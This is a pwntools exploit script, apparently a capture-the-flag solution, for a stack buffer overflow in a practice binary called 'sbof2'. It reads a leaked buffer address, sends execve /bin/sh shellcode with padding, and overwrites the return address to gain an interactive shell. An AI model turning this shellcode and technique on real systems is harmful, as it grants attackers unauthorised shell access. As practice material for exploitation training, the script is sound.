from pwn import *

context.log_level = 'DEBUG'  # 设置调试日志级别

# 定义shellcode，这里使用一个简单的执行 /bin/sh 的shellcode
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

p = process("./sbof2")  # 加载目标程序
# p = remote("8.154.20.109", 10100)

# 接收程序输出的缓冲区地址
p.recvuntil(b"gift address: ")
buffer_addr = int(p.recvline().strip(), 16)

print(f"Buffer address: {hex(buffer_addr)}")

# 构造payload
payload = shellcode  # 首先放入shellcode
payload += b"A" * (256 + 8 - len(shellcode))  # 填充剩余的缓冲区空间
payload += p64(buffer_addr)  # 覆盖返回地址为缓冲区的起始地址

# 发送payload
p.sendline(payload)

# 获取shell
p.interactive()

